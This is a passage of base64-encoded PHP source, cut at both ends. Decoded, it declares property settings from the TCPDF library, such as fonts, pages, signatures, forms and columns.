D0gZmFsc2U7CgoJLyoqCgkgKiBDb3VudCB0aGUgbGF0ZXN0IGluc2VydGVkIHZlcnRpY2FsIHNwYWNlcyBvbiBIVE1MLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuMC4wMjEgKDIwMDgtMDgtMjQpCgkgKi8KCXByb3RlY3RlZCAkaHRtbHZzcGFjZSA9IDA7CgoJLyoqCgkgKiBBcnJheSBvZiBTcG90IGNvbG9ycy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjAuMDI0ICgyMDA4LTA5LTEyKQoJICovCglwcm90ZWN0ZWQgJHNwb3RfY29sb3JzID0gYXJyYXkoKTsKCgkvKioKCSAqIFN5bWJvbCB1c2VkIGZvciBIVE1MIHVub3JkZXJlZCBsaXN0IGl0ZW1zLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuMC4wMjggKDIwMDgtMDktMjYpCgkgKi8KCXByb3RlY3RlZCAkbGlzeW1ib2wgPSAnJzsKCgkvKioKCSAqIFN0cmluZyB1c2VkIHRvIG1hcmsgdGhlIGJlZ2lubmluZyBhbmQgZW5kIG9mIEVQUyBpbWFnZSBibG9ja3MuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC4xLjAwMCAoMjAwOC0xMC0xOCkKCSAqLwoJcHJvdGVjdGVkICRlcHNtYXJrZXIgPSAneCMhI0VQUyMhI3gnOwoKCS8qKgoJICogQXJyYXkgb2YgdHJhbnNmb3JtYXRpb24gbWF0cml4LgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuMi4wMDAgKDIwMDgtMTAtMjkpCgkgKi8KCXByb3RlY3RlZCAkdHJhbnNmbWF0cml4ID0gYXJyYXkoKTsKCgkvKioKCSAqIEN1cnJlbnQga2V5IGZvciB0cmFuc2Zvcm1hdGlvbiBtYXRyaXguCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC44LjAwNSAoMjAwOS0wOS0xNykKCSAqLwoJcHJvdGVjdGVkICR0cmFuc2ZtYXRyaXhfa2V5ID0gMDsKCgkvKioKCSAqIEJvb2tsZXQgbW9kZSBmb3IgZG91YmxlLXNpZGVkIHBhZ2VzLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuMi4wMDAgKDIwMDgtMTAtMjkpCgkgKi8KCXByb3RlY3RlZCAkYm9va2xldCA9IGZhbHNlOwoKCS8qKgoJICogRXBzaWxvbiB2YWx1ZSB1c2VkIGZvciBmbG9hdCBjYWxjdWxhdGlvbnMuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC4yLjAwMCAoMjAwOC0xMC0yOSkKCSAqLwoJcHJvdGVjdGVkICRmZXBzID0gMC4wMDU7CgoJLyoqCgkgKiBBcnJheSB1c2VkIGZvciBjdXN0b20gdmVydGljYWwgc3BhY2VzIGZvciBIVE1MIHRhZ3MuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC4yLjAwMSAoMjAwOC0xMC0zMCkKCSAqLwoJcHJvdGVjdGVkICR0YWd2c3BhY2VzID0gYXJyYXkoKTsKCgkvKioKCSAqIEhUTUwgUEFSU0VSOiBjdXN0b20gaW5kZW50IGFtb3VudCBmb3IgbGlzdHMuIE5lZ2F0aXZlIHZhbHVlIG1lYW5zIGRpc2FibGVkLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuMi4wMDcgKDIwMDgtMTEtMTIpCgkgKi8KCXByb3RlY3RlZCAkY3VzdG9tbGlzdGluZGVudCA9IC0xOwoKCS8qKgoJICogQm9vbGVhbiBmbGFnIHRvIGluZGljYXRlIGlmIHRoZSBib3JkZXIgb2YgdGhlIGNlbGwgc2lkZXMgdGhhdCBjcm9zcyB0aGUgcGFnZSBzaG91bGQgYmUgcmVtb3ZlZC4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjIuMDEwICgyMDA4LTExLTE0KQoJICovCglwcm90ZWN0ZWQgJG9wZW5jZWxsID0gdHJ1ZTsKCgkvKioKCSAqIEFycmF5IG9mIGZpbGVzIHRvIGVtYmVkZC4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjQuMDAwICgyMDA4LTEyLTA3KQoJICovCglwcm90ZWN0ZWQgJGVtYmVkZGVkZmlsZXMgPSBhcnJheSgpOwoKCS8qKgoJICogQm9vbGVhbiBmbGFnIHRvIGluZGljYXRlIGlmIHdlIGFyZSBpbnNpZGUgYSBQUkUgdGFnLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuNC4wMDEgKDIwMDgtMTItMDgpCgkgKi8KCXByb3RlY3RlZCAkcHJlbW9kZSA9IGZhbHNlOwoKCS8qKgoJICogQXJyYXkgdXNlZCB0byBzdG9yZSBwb3NpdGlvbnMgb2YgZ3JhcGhpY3MgdHJhbnNmb3JtYXRpb24gYmxvY2tzIGluc2lkZSB0aGUgcGFnZSBidWZmZXIuCgkgKiBrZXlzIGFyZSB0aGUgcGFnZSBudW1iZXJzCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC40LjAwMiAoMjAwOC0xMi0wOSkKCSAqLwoJcHJvdGVjdGVkICR0cmFuc2ZtcmsgPSBhcnJheSgpOwoKCS8qKgoJICogRGVmYXVsdCBjb2xvciBmb3IgaHRtbCBsaW5rcy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjQuMDAzICgyMDA4LTEyLTA5KQoJICovCglwcm90ZWN0ZWQgJGh0bWxMaW5rQ29sb3JBcnJheSA9IGFycmF5KDAsIDAsIDI1NSk7CgoJLyoqCgkgKiBEZWZhdWx0IGZvbnQgc3R5bGUgdG8gYWRkIHRvIGh0bWwgbGlua3MuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC40LjAwMyAoMjAwOC0xMi0wOSkKCSAqLwoJcHJvdGVjdGVkICRodG1sTGlua0ZvbnRTdHlsZSA9ICdVJzsKCgkvKioKCSAqIENvdW50cyB0aGUgbnVtYmVyIG9mIHBhZ2VzLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuNS4wMDAgKDIwMDgtMTItMzEpCgkgKi8KCXByb3RlY3RlZCAkbnVtcGFnZXMgPSAwOwoKCS8qKgoJICogQXJyYXkgY29udGFpbmluZyBwYWdlIGxlbmd0aHMgaW4gYnl0ZXMuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC41LjAwMCAoMjAwOC0xMi0zMSkKCSAqLwoJcHJvdGVjdGVkICRwYWdlbGVuID0gYXJyYXkoKTsKCgkvKioKCSAqIENvdW50cyB0aGUgbnVtYmVyIG9mIHBhZ2VzLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuNS4wMDAgKDIwMDgtMTItMzEpCgkgKi8KCXByb3RlY3RlZCAkbnVtaW1hZ2VzID0gMDsKCgkvKioKCSAqIFN0b3JlIHRoZSBpbWFnZSBrZXlzLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuNS4wMDAgKDIwMDgtMTItMzEpCgkgKi8KCXByb3RlY3RlZCAkaW1hZ2VrZXlzID0gYXJyYXkoKTsKCgkvKioKCSAqIExlbmd0aCBvZiB0aGUgYnVmZmVyIGluIGJ5dGVzLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuNS4wMDAgKDIwMDgtMTItMzEpCgkgKi8KCXByb3RlY3RlZCAkYnVmZmVybGVuID0gMDsKCgkvKioKCSAqIENvdW50cyB0aGUgbnVtYmVyIG9mIGZvbnRzLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuNS4wMDAgKDIwMDktMDEtMDIpCgkgKi8KCXByb3RlY3RlZCAkbnVtZm9udHMgPSAwOwoKCS8qKgoJICogU3RvcmUgdGhlIGZvbnQga2V5cy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjUuMDAwICgyMDA5LTAxLTAyKQoJICovCglwcm90ZWN0ZWQgJGZvbnRrZXlzID0gYXJyYXkoKTsKCgkvKioKCSAqIFN0b3JlIHRoZSBmb250IG9iamVjdCBJRHMuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC44LjAwMSAoMjAwOS0wOS0wOSkKCSAqLwoJcHJvdGVjdGVkICRmb250X29ial9pZHMgPSBhcnJheSgpOwoKCS8qKgoJICogU3RvcmUgdGhlIGZhZ2Ugc3RhdHVzICh0cnVlIHdoZW4gb3BlbmVkLCBmYWxzZSB3aGVuIGNsb3NlZCkuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC41LjAwMCAoMjAwOS0wMS0wMikKCSAqLwoJcHJvdGVjdGVkICRwYWdlb3BlbiA9IGFycmF5KCk7CgoJLyoqCgkgKiBEZWZhdWx0IG1vbm9zcGFjZSBmb250LgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuNS4wMjUgKDIwMDktMDMtMTApCgkgKi8KCXByb3RlY3RlZCAkZGVmYXVsdF9tb25vc3BhY2VkX2ZvbnQgPSAnY291cmllcic7CgoJLyoqCgkgKiBDbG9uZWQgY29weSBvZiB0aGUgY3VycmVudCBjbGFzcyBvYmplY3QuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC41LjAyOSAoMjAwOS0wMy0xOSkKCSAqLwoJcHJvdGVjdGVkICRvYmpjb3B5OwoKCS8qKgoJICogQXJyYXkgdXNlZCB0byBzdG9yZSB0aGUgbGVuZ3RocyBvZiBjYWNoZSBmaWxlcy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjUuMDI5ICgyMDA5LTAzLTE5KQoJICovCglwcm90ZWN0ZWQgJGNhY2hlX2ZpbGVfbGVuZ3RoID0gYXJyYXkoKTsKCgkvKioKCSAqIFRhYmxlIGhlYWRlciBjb250ZW50IHRvIGJlIHJlcGVhdGVkIG9uIGVhY2ggbmV3IHBhZ2UuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC41LjAzMCAoMjAwOS0wMy0yMCkKCSAqLwoJcHJvdGVjdGVkICR0aGVhZCA9ICcnOwoKCS8qKgoJICogTWFyZ2lucyB1c2VkIGZvciB0YWJsZSBoZWFkZXIuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC41LjAzMCAoMjAwOS0wMy0yMCkKCSAqLwoJcHJvdGVjdGVkICR0aGVhZE1hcmdpbnMgPSBhcnJheSgpOwoKCS8qKgoJICogQm9vbGVhbiBmbGFnIHRvIGVuYWJsZSBkb2N1bWVudCBkaWdpdGFsIHNpZ25hdHVyZS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjYuMDA1ICgyMDA5LTA0LTI0KQoJICovCglwcm90ZWN0ZWQgJHNpZ24gPSBmYWxzZTsKCgkvKioKCSAqIERpZ2l0YWwgc2lnbmF0dXJlIGRhdGEuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC42LjAwNSAoMjAwOS0wNC0yNCkKCSAqLwoJcHJvdGVjdGVkICRzaWduYXR1cmVfZGF0YSA9IGFycmF5KCk7CgoJLyoqCgkgKiBEaWdpdGFsIHNpZ25hdHVyZSBtYXggbGVuZ3RoLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuNi4wMDUgKDIwMDktMDQtMjQpCgkgKi8KCXByb3RlY3RlZCAkc2lnbmF0dXJlX21heF9sZW5ndGggPSAxMTc0MjsKCgkvKioKCSAqIERhdGEgZm9yIGRpZ2l0YWwgc2lnbmF0dXJlIGFwcGVhcmFuY2UuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS4zLjAxMSAoMjAxMC0wNi0xNikKCSAqLwoJcHJvdGVjdGVkICRzaWduYXR1cmVfYXBwZWFyYW5jZSA9IGFycmF5KCdwYWdlJyA9PiAxLCAncmVjdCcgPT4gJzAgMCAwIDAnKTsKCgkvKioKCSAqIEFycmF5IG9mIGVtcHR5IGRpZ2l0YWwgc2lnbmF0dXJlIGFwcGVhcmFuY2VzLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuOS4xMDEgKDIwMTEtMDctMDYpCgkgKi8KCXByb3RlY3RlZCAkZW1wdHlfc2lnbmF0dXJlX2FwcGVhcmFuY2UgPSBhcnJheSgpOwoKCS8qKgoJICogQm9vbGVhbiBmbGFnIHRvIGVuYWJsZSBkb2N1bWVudCB0aW1lc3RhbXBpbmcgd2l0aCBUU0EuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNi4wLjA4NSAoMjAxNC0wNi0xOSkKCSAqLwoJcHJvdGVjdGVkICR0c2FfdGltZXN0YW1wID0gZmFsc2U7CgoJLyoqCgkgKiBUaW1lc3RhbXBpbmcgZGF0YS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA2LjAuMDg1ICgyMDE0LTA2LTE5KQoJICovCglwcm90ZWN0ZWQgJHRzYV9kYXRhID0gYXJyYXkoKTsKCgkvKioKCSAqIFJlZ3VsYXIgZXhwcmVzc2lvbiB1c2VkIHRvIGZpbmQgYmxhbmsgY2hhcmFjdGVycyAocmVxdWlyZWQgZm9yIHdvcmQtd3JhcHBpbmcpLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuNi4wMDYgKDIwMDktMDQtMjgpCgkgKi8KCXByb3RlY3RlZCAkcmVfc3BhY2VzID0gJy9bXlxTXHhhMF0vJzsKCgkvKioKCSAqIEFycmF5IG9mICRyZV9zcGFjZXMgcGFydHMuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS41LjAxMSAoMjAxMC0wNy0wOSkKCSAqLwoJcHJvdGVjdGVkICRyZV9zcGFjZSA9IGFycmF5KCdwJyA9PiAnW15cU1x4YTBdJywgJ20nID0+ICcnKTsKCgkvKioKCSAqIERpZ2l0YWwgc2lnbmF0dXJlIG9iamVjdCBJRC4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjYuMDIyICgyMDA5LTA2LTIzKQoJICovCglwcm90ZWN0ZWQgJHNpZ19vYmpfaWQgPSAwOwoKCS8qKgoJICogSUQgb2YgcGFnZSBvYmplY3RzLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuNy4wMDAgKDIwMDktMDgtMjkpCgkgKi8KCXByb3RlY3RlZCAkcGFnZV9vYmpfaWQgPSBhcnJheSgpOwoKCS8qKgoJICogTGlzdCBvZiBmb3JtIGFubm90YXRpb25zIElEcy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjguMDAwICgyMDA5LTA5LTA3KQoJICovCglwcm90ZWN0ZWQgJGZvcm1fb2JqX2lkID0gYXJyYXkoKTsKCgkvKioKCSAqIERlYWZ1bHQgSmF2YXNjcmlwdCBmaWVsZCBwcm9wZXJ0aWVzLiBQb3NzaWJsZSB2YWx1ZXMgYXJlIGRlc2NyaWJlZCBvbiBvZmZpY2lhbCBKYXZhc2NyaXB0IGZvciBBY3JvYmF0IEFQSSByZWZlcmVuY2UuIEFubm90YXRpb24gb3B0aW9ucyBjYW4gYmUgZGlyZWN0bHkgc3BlY2lmaWVkIHVzaW5nIHRoZSAnYW9wdCcgZW50cnkuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC44LjAwMCAoMjAwOS0wOS0wNykKCSAqLwoJcHJvdGVjdGVkICRkZWZhdWx0X2Zvcm1fcHJvcCA9IGFycmF5KCdsaW5lV2lkdGgnPT4xLCAnYm9yZGVyU3R5bGUnPT4nc29saWQnLCAnZmlsbENvbG9yJz0+YXJyYXkoMjU1LCAyNTUsIDI1NSksICdzdHJva2VDb2xvcic9PmFycmF5KDEyOCwgMTI4LCAxMjgpKTsKCgkvKioKCSAqIEphdmFzY3JpcHQgb2JqZWN0cyBhcnJheS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjguMDAwICgyMDA5LTA5LTA3KQoJICovCglwcm90ZWN0ZWQgJGpzX29iamVjdHMgPSBhcnJheSgpOwoKCS8qKgoJICogQ3VycmVudCBmb3JtIGFjdGlvbiAodXNlZCBkdXJpbmcgWEhUTUwgcmVuZGVyaW5nKS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjguMDAwICgyMDA5LTA5LTA3KQoJICovCglwcm90ZWN0ZWQgJGZvcm1fYWN0aW9uID0gJyc7CgoJLyoqCgkgKiBDdXJyZW50IGZvcm0gZW5jcnlwdGlvbiB0eXBlICh1c2VkIGR1cmluZyBYSFRNTCByZW5kZXJpbmcpLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuOC4wMDAgKDIwMDktMDktMDcpCgkgKi8KCXByb3RlY3RlZCAkZm9ybV9lbmN0eXBlID0gJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCc7CgoJLyoqCgkgKiBDdXJyZW50IG1ldGhvZCB0byBzdWJtaXQgZm9ybXMuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC44LjAwMCAoMjAwOS0wOS0wNykKCSAqLwoJcHJvdGVjdGVkICRmb3JtX21vZGUgPSAncG9zdCc7CgoJLyoqCgkgKiBMaXN0IG9mIGZvbnRzIHVzZWQgb24gZm9ybSBmaWVsZHMgKGZvbnRuYW1lID0+IGZvbnRrZXkpLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuOC4wMDEgKDIwMDktMDktMDkpCgkgKi8KCXByb3RlY3RlZCAkYW5ub3RhdGlvbl9mb250cyA9IGFycmF5KCk7CgoJLyoqCgkgKiBMaXN0IG9mIHJhZGlvIGJ1dHRvbnMgcGFyZW50IG9iamVjdHMuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC44LjAwMSAoMjAwOS0wOS0wOSkKCSAqLwoJcHJvdGVjdGVkICRyYWRpb2J1dHRvbl9ncm91cHMgPSBhcnJheSgpOwoKCS8qKgoJICogTGlzdCBvZiByYWRpbyBncm91cCBvYmplY3RzIElEcy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjguMDAxICgyMDA5LTA5LTA5KQoJICovCglwcm90ZWN0ZWQgJHJhZGlvX2dyb3VwcyA9IGFycmF5KCk7CgoJLyoqCgkgKiBUZXh0IGluZGVudGF0aW9uIHZhbHVlICh1c2VkIGZvciB0ZXh0LWluZGVudCBDU1MgYXR0cmlidXRlKS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjguMDA2ICgyMDA5LTA5LTIzKQoJICovCglwcm90ZWN0ZWQgJHRleHRpbmRlbnQgPSAwOwoKCS8qKgoJICogU3RvcmUgcGFnZSBudW1iZXIgd2hlbiBzdGFydFRyYW5zYWN0aW9uKCkgaXMgY2FsbGVkLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuOC4wMDYgKDIwMDktMDktMjMpCgkgKi8KCXByb3RlY3RlZCAkc3RhcnRfdHJhbnNhY3Rpb25fcGFnZSA9IDA7CgoJLyoqCgkgKiBTdG9yZSBZIHBvc2l0aW9uIHdoZW4gc3RhcnRUcmFuc2FjdGlvbigpIGlzIGNhbGxlZC4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjkuMDAxICgyMDEwLTAzLTI4KQoJICovCglwcm90ZWN0ZWQgJHN0YXJ0X3RyYW5zYWN0aW9uX3kgPSAwOwoKCS8qKgoJICogVHJ1ZSB3aGVuIHdlIGFyZSBwcmludGluZyB0aGUgdGhlYWQgc2VjdGlvbiBvbiBhIG5ldyBwYWdlLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuOC4wMjcgKDIwMTAtMDEtMjUpCgkgKi8KCXByb3RlY3RlZCAkaW50aGVhZCA9IGZhbHNlOwoKCS8qKgoJICogQXJyYXkgb2YgY29sdW1uIG1lYXN1cmVzICh3aWR0aCwgc3BhY2UsIHN0YXJ0aW5nIFkgcG9zaXRpb24pLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuOS4wMDEgKDIwMTAtMDMtMjgpCgkgKi8KCXByb3RlY3RlZCAkY29sdW1ucyA9IGFycmF5KCk7CgoJLyoqCgkgKiBOdW1iZXIgb2YgY29sdW1zLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuOS4wMDEgKDIwMTAtMDMtMjgpCgkgKi8KCXByb3RlY3RlZCAkbnVtX2NvbHVtbnMgPSAxOwoKCS8qKgoJICogQ3VycmVudCBjb2x1bW4gbnVtYmVyLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuOS4wMDEgKDIwMTAtMDMtMjgpCgkgKi8KCXByb3RlY3RlZCAkY3VycmVudF9jb2x1bW4gPSAwOwoKCS8qKgoJICogU3RhcnRpbmcgcGFnZSBmb3IgY29sdW1ucy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjkuMDAxICgyMDEwLTAzLTI4KQoJICovCglwcm90ZWN0ZWQgJGNvbHVtbl9zdGFydF9wYWdlID0gMDsKCgkvKioKCSAqIE1heGltdW0gcGFnZSBhbmQgY29sdW1uIHNlbGVjdGVkLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuOC4wMDAgKDIwMTAtMDgtMTEpCgkgKi8KCXByb3RlY3RlZCAkbWF4c2VsY29sID0gYXJyYXkoJ3BhZ2UnID0+IDAsICdjb2x1bW4nID0+IDApOwoKCS8qKgoJICogQXJyYXkgb2Y6IFggZGlmZmVyZW5jZSBiZXR3ZWVuIHRhYmxlIGNlbGwgeCBzdGFydCBhbmQgc3RhcnRpbmcgcGFnZSBtYXJnaW4sIGNlbGxzcGFjaW5nLCBjZWxscGFkZGluZy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjguMDAwICgyMDEwLTA4LTExKQoJICovCglwcm90ZWN0ZWQgJGNvbHhzaGlmdCA9IGFycmF5KCd4JyA9PiAwLCAncycgPT4gYXJyYXkoJ0gnID0+IDAsICdWJyA9PiAwKSwgJ3AnID0+IGFycmF5KCdMJyA9PiAwLCAnVCcgPT4gMCwgJ1InID0+IDAsICdCJyA9PiAwKSk7CgoJLyoqCgkgKiBUZXh0IHJlbmRlcmluZyBtb2RlOiAwID0gRmlsbCB0ZXh0OyAxID0gU3Ryb2tlIHRleHQ7IDIgPSBGaWxsLCB0aGVuIHN0cm9rZSB0ZXh0OyAzID0gTmVpdGhlciBmaWxsIG5vciBzdHJva2UgdGV4dCAoaW52aXNpYmxlKTsgNCA9IEZpbGwgdGV4dCBhbmQgYWRkIHRvIHBhdGggZm9yIGNsaXBwaW5nOyA1ID0gU3Ryb2tlIHRleHQgYW5kIGFkZCB0byBwYXRoIGZvciBjbGlwcGluZzsgNiA9IEZpbGwsIHRoZW4gc3Ryb2tlIHRleHQgYW5kIGFkZCB0byBwYXRoIGZvciBjbGlwcGluZzsgNyA9IEFkZCB0ZXh0IHRvIHBhdGggZm9yIGNsaXBwaW5nLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuOS4wMDggKDIwMTAtMDQtMDMpCgkgKi8KCXByb3RlY3RlZCAkdGV4dHJlbmRlcm1vZGUgPSAwOwoKCS8qKgoJICogVGV4dCBzdHJva2Ugd2lkdGggaW4gZG9jIHVuaXRzLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuOS4wMDggKDIwMTAtMDQtMDMpCgkgKi8KCXByb3RlY3RlZCAkdGV4dHN0cm9rZXdpZHRoID0gMDsKCgkvKioKCSAqIEN1cnJlbnQgc3Ryb2tlIGNvbG9yLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuOS4wMDggKDIwMTAtMDQtMDMpCgkgKi8KCXByb3RlY3RlZCAkc3Ryb2tlY29sb3I7CgoJLyoqCgkgKiBEZWZhdWx0IHVuaXQgb2YgbWVhc3VyZSBmb3IgZG9jdW1lbnQuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS4wLjAwMCAoMjAxMC0wNC0yMikKCSAqLwoJcHJvdGVjdGVkICRwZGZ1bml0ID0gJ21tJzsKCgkvKioKCSAqIEJvb2xlYW4gZmxhZyB0cnVlIHdoZW4gd2UgYXJlIG9uIFRPQyAoVGFibGUgT2YgQ29udGVudCkgcGFnZS4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICR0b2NwYWdlID0gZmFsc2U7CgoJLyoqCgkgKiBCb29sZWFuIGZsYWc6IGlmIHRydWUgY29udmVydCB2ZWN0b3IgaW1hZ2VzIChTVkcsIEVQUykgdG8gcmFzdGVyIGltYWdlIHVzaW5nIEdEIG9yIEltYWdlTWFnaWNrIGxpYnJhcnkuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS4wLjAwMCAoMjAxMC0wNC0yNikKCSAqLwoJcHJvdGVjdGVkICRyYXN0ZXJpemVfdmVjdG9yX2ltYWdlcyA9IGZhbHNlOwoKCS8qKgoJICogQm9vbGVhbiBmbGFnOiBpZiB0cnVlIGVuYWJsZXMgZm9udCBzdWJzZXR0aW5nIGJ5IGRlZmF1bHQuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS4zLjAwMiAoMjAxMC0wNi0wNykKCSAqLwoJcHJvdGVjdGVkICRmb250X3N1YnNldHRpbmcgPSB0cnVlOwoKCS8qKgoJICogQXJyYXkgb2YgZGVmYXVsdCBncmFwaGljIHNldHRpbmdzLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuNS4wMDggKDIwMTAtMDctMDIpCgkgKi8KCXByb3RlY3RlZCAkZGVmYXVsdF9ncmFwaGljX3ZhcnMgPSBhcnJheSgpOwoKCS8qKgoJICogQXJyYXkgb2YgWE9iamVjdHMuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS44LjAxNCAoMjAxMC0wOC0yMykKCSAqLwoJcHJvdGVjdGVkICR4b2JqZWN0cyA9IGFycmF5KCk7CgoJLyoqCgkgKiBCb29sZWFuIHZhbHVlIHRydWUgd2hlbiB3ZSBhcmUgaW5zaWRlIGFuIFhPYmplY3QuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS44LjAxNyAoMjAxMC0wOC0yNCkKCSAqLwoJcHJvdGVjdGVkICRpbnhvYmogPSBmYWxzZTsKCgkvKioKCSAqIEN1cnJlbnQgWE9iamVjdCBJRC4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjguMDE3ICgyMDEwLTA4LTI0KQoJICovCglwcm90ZWN0ZWQgJHhvYmppZCA9ICcnOwoKCS8qKgoJICogUGVyY2VudGFnZSBvZiBjaGFyYWN0ZXIgc3RyZXRjaGluZy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjkuMDAwICgyMDEwLTA5LTI5KQoJICovCglwcm90ZWN0ZWQgJGZvbnRfc3RyZXRjaGluZyA9IDEwMDsKCgkvKioKCSAqIEluY3JlYXNlcyBvciBkZWNyZWFzZXMgdGhlIHNwYWNlIGJldHdlZW4gY2hhcmFjdGVycyBpbiBhIHRleHQgYnkgdGhlIHNwZWNpZmllZCBhbW91bnQgKHRyYWNraW5nKS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjkuMDAwICgyMDEwLTA5LTI5KQoJICovCglwcm90ZWN0ZWQgJGZvbnRfc3BhY2luZyA9IDA7CgoJLyoqCgkgKiBBcnJheSBvZiBuby13cml0ZSByZWdpb25zLgoJICogKCdwYWdlJyA9PiBwYWdlIG51bWJlciBvciBlbXB5IGZvciBjdXJyZW50IHBhZ2UsICd4dCcgPT4gWCB0b3AsICd5dCcgPT4gWSB0b3AsICd4YicgPT4gWCBib3R0b20sICd5YicgPT4gWSBib3R0b20sICdzaWRlJyA9PiBwYWdlIHNpZGUgJ0wnID0gbGVmdCBvciAnUicgPSByaWdodCkKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjkuMDAzICgyMDEwLTEwLTE0KQoJICovCglwcm90ZWN0ZWQgJHBhZ2VfcmVnaW9ucyA9IGFycmF5KCk7CgoJLyoqCgkgKiBCb29sZWFuIHZhbHVlIHRydWUgd2hlbiBwYWdlIHJlZ2lvbiBjaGVjayBpcyBhY3RpdmUuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkY2hlY2tfcGFnZV9yZWdpb25zID0gdHJ1ZTsKCgkvKioKCSAqIEFycmF5IG9mIFBERiBsYXllcnMgZGF0YS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjkuMTAyICgyMDExLTA3LTEzKQoJICovCglwcm90ZWN0ZWQgJHBkZmxheWVycyA9IGFycmF5KCk7CgoJLyoqCgkgKiBBIGRpY3Rpb25hcnkgb2YgbmFtZXMgYW5kIGNvcnJlc3BvbmRpbmcgZGVzdGluYXRpb25zIChEZXN0cyBrZXkgb24gZG9jdW1lbnQgQ2F0YWxvZykuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS45LjA5NyAoMjAxMS0wNi0yMykKCSAqLwoJcHJvdGVjdGVkICRkZXN0cyA9IGFycmF5KCk7CgoJLyoqCgkgKiBPYmplY3QgSUQgZm9yIE5hbWVkIERlc3RpbmF0aW9ucwoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuOS4wOTcgKDIwMTEtMDYtMjMpCgkgKi8KCXByb3RlY3RlZCAkbl9kZXN0czsKCgkvKioKCSAqIEVtYmVkZGVkIEZpbGVzIE5hbWVzCgkgKiBAcHJvdGVjdGVkCgkg